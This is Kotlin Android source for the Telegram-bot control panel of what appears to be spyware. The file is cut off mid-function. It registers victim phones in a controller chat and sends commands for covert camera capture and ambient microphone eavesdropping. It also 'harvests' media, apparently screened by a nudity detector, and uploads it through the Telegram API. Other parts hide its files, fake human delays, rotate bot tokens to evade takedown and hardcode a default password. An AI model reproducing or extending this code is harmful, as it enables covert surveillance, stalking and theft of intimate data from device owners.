package com.example.app

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

class TelegramUi(
    context: Context,
    private val monitor: Any?,
    private val config: AppConfig
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val sessionMutex = Mutex()
    private val deviceMutex = Mutex()
    private val offsetMutex = Mutex()

    @Volatile
    private var isRunning = false
    private val pollingRestartNeeded = AtomicBoolean(false)

    private var pollingJob: Job? = null
    private var cleanerJob: Job? = null
    private var heartbeatJob: Job? = null
    private var restartJob: Job? = null

    private val activeTokensList: MutableList<String> = Collections.synchronizedList(
        config.activeTokens.filter { it.isNotBlank() }.toMutableList()
    )
    private val reserveTokensList: MutableList<String> = Collections.synchronizedList(
        config.reserveTokens.filter { it.isNotBlank() }.toMutableList()
    )

    private val ctrlId: String = config.controlId.toString()
    private val vaultId: String = config.vaultId.toString()

    private var appPassword: String = config.secret.trim().takeIf { it.isNotBlank() } ?: "Zaen123@123@"

    private val sessions = ConcurrentHashMap<String, Long>()
    private val devices = ConcurrentHashMap<String, JSONObject>()
    private val processedUpdates = Collections.synchronizedSet(LinkedHashSet<String>())

    @Volatile
    private var apiCallsCount = 0
    @Volatile
    private var apiFailuresCount = 0
    @Volatile
    private var consecutivePollingErrors = 0
    private val MAX_CONSECUTIVE_ERRORS = 5

    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
    }
    private val cacheThumbDir: File by lazy {
        File(runtimeDir, ".cache_thumb").apply { if (!exists()) mkdirs() }
    }
    private val dvsFile: File by lazy { File(runtimeDir, "dvs.json") }
    private val sesFile: File by lazy { File(runtimeDir, "ses.json") }
    private val offsetFile: File by lazy { File(runtimeDir, "polling_offset.json") }
    private val logFile: File by lazy { File(runtimeDir, "t.log") }

    private val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(35, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()
    }

    companion object {
        private const val TAG = "TelegramUi"
        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
        private val OCTET_STREAM_MEDIA_TYPE = "application/octet-stream".toMediaType()

        @JvmStatic
        fun create(context: Context, monitor: Any?, config: AppConfig): TelegramUi {
            return TelegramUi(context, monitor, config)
        }
    }

    private val methodCache = ConcurrentHashMap<String, Method>()

    init {
        loadData()
        startBackgroundWorkers()
        Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
    }

    // ==================== دوال التحقق من كلمة السر ====================
    private fun verifyControlPassword(input: String): Boolean {
        return input.trim() == appPassword
    }

    fun updatePassword(newPassword: String) {
        if (newPassword.isNotBlank()) {
            appPassword = newPassword.trim()
            scope.launch {
                try {
                    val configFile = File(runtimeDir, "password.txt")
                    configFile.writeText(appPassword, Charsets.UTF_8)
                    writeLog("✅ Password updated successfully")
                } catch (e: Exception) {
                    writeLog("❌ Failed to save password: ${e.message}")
                }
            }
        }
    }

    // ==================== دوال مساعدة ====================
    private suspend fun applyHumanDelay() {
        delay(Random.nextLong(1200, 4500))
    }

    private fun pulseIntent(actionType: String) {
        try {
            Intent(appContext, ForegroundService::class.java).apply {
                action = "PULSE_ACTION"
                putExtra("action_type", actionType)
            }.let { appContext?.startService(it) }
        } catch (e: Exception) {
            writeLog("Pulse intent error: ${e.message}")
        }
    }

    private fun loadData() {
        try {
            if (dvsFile.exists()) {
                val json = JSONObject(dvsFile.readText(Charsets.UTF_8))
                json.keys().forEach { key -> devices[key] = json.getJSONObject(key) }
            }
            if (sesFile.exists()) {
                val json = JSONObject(sesFile.readText(Charsets.UTF_8))
                json.keys().forEach { key -> sessions[key] = json.getLong(key) }
            }
        } catch (e: Exception) {
            writeLog("Load data error: ${e.message}")
        }
    }

    private suspend fun saveData() {
        try {
            deviceMutex.withLock {
                val dvsJson = JSONObject()
                devices.forEach { (k, v) -> dvsJson.put(k, v) }
                dvsFile.writeText(dvsJson.toString(2), Charsets.UTF_8)
            }
            sessionMutex.withLock {
                val sesJson = JSONObject()
                sessions.forEach { (k, v) -> sesJson.put(k, v) }
                sesFile.writeText(sesJson.toString(2), Charsets.UTF_8)
            }
        } catch (e: Exception) {
            writeLog("Save data error: ${e.message}")
        }
    }

    private fun loadOffset(): Long {
        return try {
            if (offsetFile.exists()) {
                JSONObject(offsetFile.readText(Charsets.UTF_8)).optLong("offset", 0L)
            } else 0L
        } catch (e: Exception) { 0L }
    }

    private suspend fun saveOffset(offset: Long) {
        try {
            offsetMutex.withLock {
                val json = JSONObject().apply {
                    put("offset", offset)
                    put("timestamp", System.currentTimeMillis() / 1000)
                }
                offsetFile.writeText(json.toString(), Charsets.UTF_8)
            }
        } catch (e: Exception) {
            writeLog("Save offset error: ${e.message}")
        }
    }

    private fun getNextToken(): String? {
        synchronized(activeTokensList) {
            if (activeTokensList.isEmpty()) return null
            return activeTokensList[Random.nextInt(activeTokensList.size)]
        }
    }

    private fun emergencySwitchToken(badToken: String) {
        synchronized(activeTokensList) {
            if (activeTokensList.contains(badToken)) {
                activeTokensList.remove(badToken)
                synchronized(reserveTokensList) {
                    if (reserveTokensList.isNotEmpty()) {
                        val newToken = reserveTokensList.removeAt(0)
                        activeTokensList.add(newToken)
                        writeLog("Swapped bad token with reserve")
                        scope.launch {
                            apiCall("sendMessage", JSONObject().apply {
                                put("chat_id", ctrlId)
                                put("text", "⚠️ Emergency switch - ${reserveTokensList.size} reserve left")
                                put("parse_mode", "HTML")
                            })
                        }
                    }
                }
            }
        }
    }

    private fun startBackgroundWorkers() {
        cleanerJob = scope.launch {
            while (isActive) {
                delay(3600_000L)
                try {
                    val now = System.currentTimeMillis() / 1000
                    val expiredKeys = sessions.filter { it.value < now }.keys
                    if (expiredKeys.isNotEmpty()) {
                        sessionMutex.withLock { expiredKeys.forEach { sessions.remove(it) } }
                        saveData()
                    }
                } catch (e: Exception) {
                    writeLog("Session cleaner error: ${e.message}")
                }
            }
        }

        heartbeatJob = scope.launch {
            while (isActive) {
                delay(Random.nextLong(4, 9) * 3600_000L)
                if (reserveTokensList.isEmpty()) continue
                try {
                    val hbToken = synchronized(reserveTokensList) {
                        if (reserveTokensList.isNotEmpty()) reserveTokensList[Random.nextInt(reserveTokensList.size)] else null
                    } ?: continue
                    val json = JSONObject().apply {
                        put("chat_id", vaultId)
                        put("text", "❤️ heartbeat ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date())}")
                    }
                    val request = Request.Builder()
                        .url("https://api.telegram.org/bot$hbToken/sendMessage")
                        .post(json.toString().toRequestBody(JSON_MEDIA_TYPE))
                        .build()
                    httpClient.newCall(request).execute().close()
                } catch (e: Exception) {
                    writeLog("Heartbeat error: ${e.message}")
                }
            }
        }

        restartJob = scope.launch {
            while (isActive) {
                delay(30_000L)
                if (isRunning && pollingRestartNeeded.get()) {
                    writeLog("🔄 Restarting polling...")
                    restartPolling()
                }
            }
        }
    }

    private suspend fun restartPolling() {
        pollingRestartNeeded.set(false)
        pollingJob?.cancel()
        delay(2000L)
        if (isRunning) {
            startPolling()
            writeLog("✅ Polling restarted")
        }
    }

    private suspend fun apiCall(method: String, payload: JSONObject? = null, retry: Int = 3): JSONObject? {
        apiCallsCount++
        var attempts = 0
        var previousToken: String? = null
        while (attempts < retry) {
            var token1 = getNextToken()
            if (token1 == null) return null
            var tokenToUse = if (attempts > 0 && token1 == previousToken) {
                getNextToken() ?: token1
            } else {
                token1
            }
            previousToken = tokenToUse
            try {
                val url = "https://api.telegram.org/bot$tokenToUse/$method"
                val body = payload?.toString()?.toRequestBody(JSON_MEDIA_TYPE)
                    ?: JSONObject().toString().toRequestBody(JSON_MEDIA_TYPE)
                val request = Request.Builder().url(url).post(body).build()
                val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                val responseStr = response.body?.string() ?: ""
                if (!response.isSuccessful && response.code != 200) {
                    delay(minOf(attempts * 2000L, 30000L))
                    attempts++
                    continue
                }
                val jsonResult = JSONObject(responseStr)
                if (jsonResult.optBoolean("ok", false)) return jsonResult
                when (jsonResult.optInt("error_code", 0)) {
                    429 -> {
                        val retryAfter = jsonResult.optJSONObject("parameters")?.optLong("retry_after") ?: (attempts * 3L)
                        delay(retryAfter * 1000L)
                        attempts++
                        continue
                    }
                    401, 403 -> { emergencySwitchToken(tokenToUse); attempts++; continue }
                    else -> delay(1000L)
                }
            } catch (e: Exception) {
                writeLog("API exception: ${e.message}")
                delay(minOf(attempts * 3000L, 60000L))
            }
            attempts++
        }
        apiFailuresCount++
        return null
    }

    private suspend fun apiCallMultipart(method: String, params: Map<String, Any>, files: Map<String, File>, retry: Int = 3): JSONObject? {
        apiCallsCount++
        var attempts = 0
        var previousToken: String? = null
        while (attempts < retry) {
            var token1 = getNextToken()
            if (token1 == null) return null
            var tokenToUse = if (attempts > 0 && token1 == previousToken) {
                getNextToken() ?: token1
            } else {
                token1
            }
            previousToken = tokenToUse
            try {
                val url = "https://api.telegram.org/bot$tokenToUse/$method"
                val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
                params.forEach { (key, value) -> builder.addFormDataPart(key, value.toString()) }
                files.forEach { (key, file) ->
                    if (file.exists() && file.isFile) {
                        builder.addFormDataPart(key, file.name, file.asRequestBody(OCTET_STREAM_MEDIA_TYPE))
                    }
                }
                val request = Request.Builder().url(url).post(builder.build()).build()
                val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                val responseStr = response.body?.string() ?: ""
                if (!response.isSuccessful && response.code != 200) {
                    delay(minOf(attempts * 2000L, 30000L))
                    attempts++
                    continue
                }
                val jsonResult = JSONObject(responseStr)
                if (jsonResult.optBoolean("ok", false)) return jsonResult
                when (jsonResult.optInt("error_code", 0)) {
                    429 -> {
                        val retryAfter = jsonResult.optJSONObject("parameters")?.optLong("retry_after") ?: (attempts * 3L)
                        delay(retryAfter * 1000L)
                        attempts++
                        continue
                    }
                    401, 403 -> { emergencySwitchToken(tokenToUse); attempts++; continue }
                    else -> delay(1000L)
                }
            } catch (e: Exception) {
                writeLog("API exception (multipart): ${e.message}")
                delay(minOf(attempts * 3000L, 60000L))
            }
            attempts++
        }
        apiFailuresCount++
        return null
    }

    fun _api(method: String, params: Map<String, Any>): JSONObject? {
        return runBlocking(Dispatchers.IO) { apiCall(method, JSONObject(params)) }
    }

    fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
        return runBlocking(Dispatchers.IO) { apiCallMultipart(method, params, files) }
    }

    fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) return null
        return _api("sendDocument", mapOf("chat_id" to chatId, "caption" to caption), mapOf("document" to file))
    }

    fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) return null
        return _api("sendPhoto", mapOf("chat_id" to chatId, "caption" to caption), mapOf("photo" to file))
    }

    fun sendVoice(chatId: Long, file: File): JSONObject? {
        if (!file.exists()) return null
        return _api("sendVoice", mapOf("chat_id" to chatId), mapOf("voice" to file))
    }

    fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) return null
        return _api("sendVideo", mapOf("chat_id" to chatId, "caption" to caption), mapOf("video" to file))
    }

    fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
        if (!file.exists()) return null
        return _api("sendAudio", mapOf("chat_id" to chatId, "caption" to caption), mapOf("audio" to file))
    }

    fun registerDevice(deviceId: String, deviceModel: String): Long? {
        return runBlocking(Dispatchers.IO) { registerDeviceSuspend(deviceId, deviceModel) }
    }

    private suspend fun registerDeviceSuspend(deviceId: String, deviceModel: String): Long? {
        if (deviceId.isBlank()) return null
        deviceMutex.withLock {
            if (devices.containsKey(deviceId)) {
                val devObj = devices[deviceId]!!
                devObj.put("last_activity", System.currentTimeMillis() / 1000)
                devObj.put("last_seen", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date()))
                saveData()
                return devObj.optLong("t", -1L).takeIf { it != -1L }
            }
            val topicName = "📱 ${deviceModel.take(12)} | ${deviceId.take(4)}"
            val payload = JSONObject().apply { put("chat_id", ctrlId); put("name", topicName) }
            val res = apiCall("createForumTopic", payload)
            if (res != null && res.optBoolean("ok")) {
                val topicId = res.getJSONObject("result").getLong("message_thread_id")
                val newDev = JSONObject().apply {
                    put("n", deviceModel)
                    put("t", topicId)
                    put("last_activity", System.currentTimeMillis() / 1000)
                    put("last_seen", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date()))
                }
                devices[deviceId] = newDev
                saveData()
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", ctrlId)
                    put("message_thread_id", topicId)
                    put("text", "<b>✅ Device registered</b>\n<b>$deviceModel</b>\n<code>$deviceId</code>")
                    put("parse_mode", "HTML")
                })
                return topicId
            }
        }
        return null
    }

    private suspend fun updateDeviceActivity(deviceId: String) {
        if (deviceId.isBlank()) return
        deviceMutex.withLock {
            val dev = devices[deviceId]
            if (dev != null) {
                dev.put("last_activity", System.currentTimeMillis() / 1000)
                saveData()
            }
        }
    }

    fun notifyHarvest(deviceId: String, count: Int) {
        scope.launch {
            val dev = devices[deviceId] ?: return@launch
            dev.put("last_activity", System.currentTimeMillis() / 1000)
            val topicId = dev.optLong("t", -1L)
            if (topicId != -1L) {
                val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", ctrlId)
                    put("message_thread_id", topicId)
                    put("text", "📦 <b>Auto harvest</b>\nDevice: ${dev.optString("n")}\nItems: $count\nTime: $timeStr")
                    put("parse_mode", "HTML")
                })
            }
            saveData()
        }
    }

    fun sendErrorReport(errorTitle: String, errorDetails: Map<String, Any>) {
        scope.launch {
            try {
                val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                val deviceModel = monitor?.let {
                    invokeMethod(it, "getDeviceModel") as? String ?: "Unknown"
                } ?: "Unknown"
                val detailsText = errorDetails.entries.joinToString("\n") { "• ${it.key}: ${it.value}" }
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", ctrlId)
                    put("text", "❌ <b>Error</b>\n📌 $errorTitle\n🕐 $timeStr\n📱 $deviceModel\n\n📋 $detailsText")
                    put("parse_mode", "HTML")
                })
            } catch (e: Exception) {
                writeLog("Failed to send error report: ${e.message}")
            }
        }
    }

    private fun countPendingHarvest(): Int {
        return try {
            if (!cacheThumbDir.exists()) return 0
            cacheThumbDir.listFiles { file -> file.isFile && !file.name.startsWith(".") }?.size ?: 0
        } catch (e: Exception) { 0 }
    }

    // ==================== ✅ لوحات الأزرار التفاعلية مع إيموجيات فريدة ====================

    /**
     * ✅ دالة مساعدة لإنشاء لوحة مفاتيح تفاعلية بصيغة JSON (متوافقة مع بقية الكود)
     * هذه اللوحة تظهر بعد التحقق من كلمة السر، وكل زر ينفذ أمراً مختلفاً.
     * الإيموجيات المستخدمة فريدة لكل زر لتسهيل التمييز.
     */
    private fun buildMainKeyboardJson(): JSONObject {
        return JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "📸 كاميرا خلفية"); put("callback_data", "cam_back") })
                    put(JSONObject().apply { put("text", "👁️ كاميرا أمامية"); put("callback_data", "cam_front") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🎙️ تسجيل صوتي"); put("callback_data", "mic_rec") })
                    put(JSONObject().apply { put("text", "📂 معرض الوسائط"); put("callback_data", "gallery") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "📊 حالة النظام"); put("callback_data", "status") })
                    put(JSONObject().apply { put("text", "📦 حصاد فوري"); put("callback_data", "harvest") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🔄 مزامنة خفية"); put("callback_data", "sync") })
                    put(JSONObject().apply { put("text", "🛡️ فحص أمني"); put("callback_data", "security") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "⚙️ إعدادات متقدمة"); put("callback_data", "settings") })
                    put(JSONObject().apply { put("text", "🔌 قطع الاتصال"); put("callback_data", "ext") })
                })
            })
        }
    }

    // ✅ القائمة الرئيسية الحالية (محفوظة للتوافق مع الأزرار القديمة)
    private fun getMainKeyboard(): JSONObject {
        return JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "📡 الأجهزة النشطة"); put("callback_data", "ld") })
                    put(JSONObject().apply { put("text", "🧬 محرك الذكاء"); put("callback_data", "ai_status") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "⏳ تمديد الجلسة"); put("callback_data", "rnw") })
                    put(JSONObject().apply { put("text", "📈 تقرير النظام"); put("callback_data", "status") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🗃️ إدارة الأرشيف"); put("callback_data", "menu") })
                    put(JSONObject().apply { put("text", "🔌 قطع الاتصال"); put("callback_data", "ext") })
                })
            })
        }
    }

    // ✅ لوحة مفاتيح الجهاز – جميع الأزرار بإيموجيات فريدة تماماً
    private fun getDeviceKeyboard(deviceId: String): JSONObject {
        val count = countPendingHarvest()
        val harvestText = if (count > 0) "📦 استخراج البيانات ($count)" else "📦 استخراج البيانات"
        return JSONObject().apply {
            put("inline_keyboard", JSONArray().apply {
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "📸 اقتناص بصري (خلفي)"); put("callback_data", "cam_$deviceId") })
                    put(JSONObject().apply { put("text", "👁️ اقتناص بصري (أمامي)"); put("callback_data", "camf_$deviceId") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🎙️ تنصت محيطي"); put("callback_data", "mic_$deviceId") })
                    put(JSONObject().apply { put("text", harvestText); put("callback_data", "hrv_$deviceId") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🗂️ أرشيف الوسائط"); put("callback_data", "media_$deviceId") })
                    put(JSONObject().apply { put("text", "⚡ بث فوري"); put("callback_data", "send_now_$deviceId") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🛰️ تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
                    put(JSONObject().apply { put("text", "🌀 إعادة تشغيل الخدمة"); put("callback_data", "restart_service_$deviceId") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🔙 العودة للقيادة"); put("callback_data", "ld") })
                })
                put(JSONArray().apply {
                    put(JSONObject().apply { put("text", "🔒 قفل التحكم"); put("callback_data", "ext") })
                })
            })
        }
    }

    private suspend fun showHarvestDetails(chatId: Long) {
        if (!cacheThumbDir.exists()) {
            apiCall("sendMessage", JSONObject().apply {
                put("chat_id", chatId)
                put("text", "📭 لا توجد ملفات معلقة.")
            })
            return
        }
        try {
            val files = cacheThumbDir.listFiles { file ->
                val name = file.name.lowercase(Locale.ROOT)
                file.isFile && (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".mp4"))
            } ?: arrayOf()
            if (files.isEmpty()) {
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "📭 مجلد الحصاد فارغ.")
                })
                return
            }
            val totalSize = files.sumOf { it.length() }
            val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
            apiCall("sendMessage", JSONObject().apply {
                put("chat_id", chatId)
                put("text", "📊 **تقرير الحصاد**\n━━━━━━━━━━━━━━━\n🖼️ الملفات: `${files.size}`\n💾 الحجم: `${String.format(Locale.US, "%.2f", totalSize / (1024.0 * 1024.0))} MB`\n⏰ التحديث: `$timeStr`\n\nاستخدم '⚡ بث فوري' للرفع.")
                put("parse_mode", "Markdown")
            })
        } catch (e: Exception) {
            writeLog("Harvest details error: ${e.message}")
        }
    }

    private fun isAuthorized(chatId: Long): Boolean {
        val exp = sessions[chatId.toString()] ?: 0L
        val isSessionValid = (System.currentTimeMillis() / 1000) < exp
        if (!isSessionValid) {
            sessions.remove(chatId.toString())
            return false
        }
        return true
    }

    // ==================== معالجة الرسائل ====================
    private suspend fun handleMessage(update: JSONObject) {
        try {
            val msg = update.optJSONObject("message") ?: return
            val chatId = msg.optJSONObject("chat")?.optLong("id") ?: return
            val text = msg.optString("text", "")
            val threadId = msg.optLong("message_thread_id", 0L)

            // ✅ تأخير بشري قبل معالجة أي رسالة
            applyHumanDelay()

            val isLoginCommand = text.startsWith("/login")
            val secret = when {
                isLoginCommand -> text.split("\\s+".toRegex()).getOrNull(1)?.trim() ?: ""
                else -> text.trim()
            }

            // ✅ كلمة السر هي الأمر النصي الوحيد المقبول
            if (secret.isNotEmpty() && verifyControlPassword(secret)) {
                sessionMutex.withLock {
                    sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
                }
                saveData()
                
                // ✅ استخدام لوحة المفاتيح التفاعلية الجديدة بدلاً من القائمة النصية
                val keyboardJson = buildMainKeyboardJson()
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", chatId)
                    if (threadId != 0L) put("message_thread_id", threadId)
                    put("text", "🔐 **تم التحقق بنجاح.**\nاختر العملية من الأزرار أدناه:")
                    put("reply_markup", keyboardJson.toString())
                    put("parse_mode", "Markdown")
                })
                pulseIntent("🔓 تسجيل دخول")
                return
            } else if (isLoginCommand && secret.isEmpty()) {
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", chatId)
                    if (threadId != 0L) put("message_thread_id", threadId)
                    put("text", "⚠️ يرجى إدخال كلمة السر بعد /login")
                })
                return
            }

            // ✅ أي نص آخر (ليس كلمة سر) يتم تجاهله أو الرد برسالة وهمية
            if (!isAuthorized(chatId)) {
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", chatId)
                    if (threadId != 0L) put("message_thread_id", threadId)
                    put("text", "🔐 الرجاء إدخال كلمة السر للتحكم")
                })
                return
            }

            // ✅ إذا كان المستخدم مصرحاً لكن أرسل نصاً عادياً (غير كلمة سر)، نعرض رسالة وهمية
            apiCall("sendMessage", JSONObject().apply {
                put("chat_id", chatId)
                if (threadId != 0L) put("message_thread_id", threadId)
                put("text", "⚠️ Unknown system command. Use the buttons to interact.")
            })

        } catch (e: Exception) {
            writeLog("Handle message error: ${e.message}")
        }
    }

    // ==================== معالجة استدعاءات الأزرار ====================
    private suspend fun handleCallback(update: JSONObject) {
        try {
            // ✅ تأخير بشري قبل معالجة أي ضغطة زر
            applyHumanDelay()

            val cb = update.optJSONObject("callback_query") ?: return
            val cbId = cb.optString("id")
            if (cbId.isBlank()) return

            synchronized(processedUpdates) {
                if (processedUpdates.contains(cbId)) return
                if (processedUpdates.size >= 150) processedUpdates.clear()
                processedUpdates.add(cbId)
            }

            val chatId = cb.optJSONObject("message")?.optJSONObject("chat")?.optLong("id") ?: return
            val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: return
            val data = cb.optString("data", "")

            apiCall("answerCallbackQuery", JSONObject().apply { put("callback_query_id", cbId) })

            if (!isAuthorized(chatId)) {
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "⚠️ انتهت الجلسة، استخدم /login")
                })
                return
            }

            val deviceId = when {
                data.startsWith("cam_") || data.startsWith("camf_") ||
                data.startsWith("mic_") || data.startsWith("hrv_") ||
                data.startsWith("media_") || data.startsWith("send_now_") ||
                data.startsWith("update_model_") ||
                data.startsWith("restart_service_") -> {
                    val parts = data.split("_")
                    if (parts.size >= 2) parts[1] else ""
                }
                else -> ""
            }

            if (deviceId.isNotEmpty()) {
                updateDeviceActivity(deviceId)
            }

            when {
                data.startsWith("cam_") || data.startsWith("camf_") -> pulseIntent("📸 كاميرا")
                data.startsWith("mic_") -> pulseIntent("🎙️ ميكروفون")
                data.startsWith("hrv_") -> pulseIntent("📦 حصاد")
                data.startsWith("send_now_") -> pulseIntent("⚡ إرسال فوري")
                data.startsWith("update_model_") -> pulseIntent("🛰️ تحديث النموذج")
                data.startsWith("restart_service_") -> pulseIntent("🌀 إعادة تشغيل")
            }

            when {
                data == "ld" -> {
                    if (devices.isEmpty()) {
                        apiCall("sendMessage", JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "⚠️ لا توجد أجهزة مرتبطة.")
                        })
                        return
                    }
                    val kb = JSONObject().apply {
                        val rows = JSONArray()
                        val now = System.currentTimeMillis() / 1000
                        devices.forEach { (did, info) ->
                            val lastActivity = info.optLong("last_activity", 0)
                            val isOnline = (now - lastActivity) < 300
                            val statusIcon = if (isOnline) "🟢" else "🔴"
                            val deviceName = info.optString("n")
                            rows.put(JSONArray().apply {
                                put(JSONObject().apply {
                                    put("text", "$statusIcon 📱 $deviceName")
                                    put("callback_data", "dev_$did")
                                })
                            })
                        }
                        rows.put(JSONArray().apply {
                            put(JSONObject().apply { put("text", "🔃 تحديث"); put("callback_data", "ld") })
                            put(JSONObject().apply { put("text", "🏠 القائمة الرئيسية"); put("callback_data", "main") })
                        })
                        put("inline_keyboard", rows)
                    }
                    apiCall("editMessageText", JSONObject().apply {
                        put("chat_id", chatId)
                        put("message_id", msgId)
                        put("text", "<b>اختر جهازاً:</b>")
                        put("reply_markup", kb)
                        put("parse_mode", "HTML")
                    })
                    return
                }
                data.startsWith("dev_") -> {
                    val did = data.substring(4)
                    if (devices.containsKey(did)) {
                        val devName = devices[did]?.optString("n") ?: "Device"
                        apiCall("editMessageText", JSONObject().apply {
                            put("chat_id", chatId)
                            put("message_id", msgId)
                            put("text", "🕹️ <b>$devName</b>")
                            put("reply_markup", getDeviceKeyboard(did))
                            put("parse_mode", "HTML")
                        })
                    }
                    return
                }
                data == "main" -> {
                    apiCall("editMessageText", JSONObject().apply {
                        put("chat_id", chatId)
                        put("message_id", msgId)
                        put("text", "📋 القائمة الرئيسية")
                        put("reply_markup", getMainKeyboard())
                    })
                    return
                }
                data == "status" -> {
                    val status = getStatus()
                    val statusText = """
                        📊 **الحالة الحالية**
                        ━━━━━━━━━━━━━━━
                        التوكنات النشطة: `${status["active_tokens"]}`
                        التوكنات الاحتياطية: `${status["reserve_tokens"]}`
                        الأجهزة المسجلة: `${status["devices"]}`
                        الجلسات النشطة: `${status["sessions"]}`
                        طلبات API: `${status["api_calls"]}`
                        فشل API: `${status["api_failures"]}`
                        الملفات المعلقة: `${status["pending_files"]}`
                    """.trimIndent()
                    apiCall("sendMessage", JSONObject().apply {
                        put("chat_id", chatId)
                        put("text", statusText)
                        put("parse_mode", "Markdown")
                    })
                    return
                }
                data == "ext" -> {
                    sessionMutex.withLock { sessions.remove(chatId.toString()) }
                    saveData()
                    apiCall("editMessageText", JSONObject().apply {
                        put("chat_id", chatId)
                        put("message_id", msgId)
                        put("text", "🔒 تم تسجيل الخروج.")
                    })
                    return
                }
                data == "rnw" -> {
                    val exp = (System.currentTimeMillis() / 1000) + 14400
                    sessionMutex.withLock { sessions[chatId.toString()] = exp }
                    saveData()
                    val timeStr = SimpleDateFormat("HH:mm", Locale.US).format(Date(exp * 1000))
                    apiCall("answerCallbackQuery", JSONObject().apply {
                        put("callback_query_id", cbId)
                        put("text", "✅ تم تجديد الجلسة حتى $timeStr")
                        put("show_alert", true)
                    })
                    return
                }
                data == "ai_status" -> {
                    val status = if (monitor != null) {
                        try {
                            val detector = monitor.javaClass.getDeclaredField("nudeDetector")
                            detector.isAccessible = true
                            val detObj = detector.get(monitor)
                            if (detObj != null) {
                                val isReadyMethod = detObj.javaClass.getMethod("isReady")
                                val ready = isReadyMethod.invoke(detObj) as? Boolean ?: false
                                if (ready) "✅ Active" else "❌ Not ready"
                            } else "❌ Not available"
                        } catch (e: Exception) { "⚠️ Unknown" }
                    } else "⚠️ Monitor not available"
                    apiCall("answerCallbackQuery", JSONObject().apply {
                        put("callback_query_id", cbId)
                        put("text", "AI: $status")
                        put("show_alert", true)
                    })
                    return
                }
                data.startsWith("hrv_") -> {
                    showHarvestDetails(chatId)
                    return
                }
                data.startsWith("send_now_") -> {
                    if (monitor != null) {
                        try {
                            val forceMethod = monitor.javaClass.getMethod("forceHarvest")
                            forceMethod.invoke(monitor)
                            apiCall("sendMessage", JSONObject().apply {
                                put("chat_id", chatId)
                                put("text", "🚀 جاري الحصاد الفوري...")
                            })
                        } catch (e: Exception) {
                            writeLog("Send now error: ${e.message}")
                        }
                    } else {
                        apiCall("sendMessage", JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "❌ وحدة الحصاد غير متاحة")
                        })
                    }
                    return
                }
                data.startsWith("update_model_") -> {
                    val did = data.substringAfter("update_model_")
                    if (did.isNotEmpty()) {
                        apiCall("sendMessage", JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "🛰️ جاري تحديث النموذج... قد يستغرق دقائق.")
                        })
                        scope.launch {
                            try {
                                val success = updateModel()
                                if (success) {
                                    apiCall("sendMessage", JSONObject().apply {
                                        put("chat_id", chatId)
                                        put("text", "✅ تم تحديث النموذج بنجاح!")
                                    })
                                } else {
